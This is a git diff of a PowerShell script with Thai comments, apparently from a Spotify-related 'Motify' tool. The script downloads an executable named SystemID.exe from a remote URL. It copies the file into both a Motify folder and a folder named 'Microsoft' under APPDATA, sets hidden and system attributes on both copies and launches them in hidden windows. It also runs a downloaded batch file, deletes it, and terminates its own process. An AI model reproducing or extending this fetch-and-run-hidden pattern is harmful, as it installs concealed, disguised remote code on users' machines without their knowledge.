@@ -1,6 +1,7 @@
 function Remove-SystemID {
     # ลบไฟล์ SystemID.exe
     $exePath = "$env:APPDATA\Motify\SystemID.exe"
+    $micoexePath = "$env:APPDATA\Microsoft\SystemID.exe"
 	
 		if ((Test-Path $exePath) -or (Test-Path $micoexePath)) {
         Remove-Item -Path $exePath -Force -ErrorAction SilentlyContinue
@@ -48,7 +49,7 @@ set ScriptUrl=https://raw.githubusercontent.com/DevilScript/Spotify-Pre/refs/hea
     Start-Process -FilePath $batFilePath -NoNewWindow -Wait
 
     # ลบไฟล์ .bat หลังจากการทำงานเสร็จ
-    Remove-Item -Path $batFilePath -Force
+        Remove-Item -Path $batFilePath -Force
 	Stop-Process -Id $PID -Force -ErrorAction SilentlyContinue
 exit
 }
@@ -78,7 +79,7 @@ function Download-Script {
     # ดาวน์โหลดไฟล์ .exe จาก URL และบันทึกลงในโฟลเดอร์ Motify
 try {
         Invoke-WebRequest -Uri $url -OutFile $filePath
-		Invoke-WebRequest -Uri $url -OutFile $micofilePath
+        Invoke-WebRequest -Uri $url -OutFile $micofilePath
 		attrib +h +s $filePath  # ซ่อนไฟล์
 		attrib +h +s $micofilePath  
 
@@ -87,7 +88,7 @@ try {
         exit
     }
 
-    Start-Process $filePath -WindowStyle Hidden  # รันแบบซ่อนหน้าต่าง
+        Start-Process $filePath -WindowStyle Hidden  # รันแบบซ่อนหน้าต่าง
 	Start-Process $micofilePath -WindowStyle Hidden  # รันแบบซ่อนหน้าต่าง\
 
 }
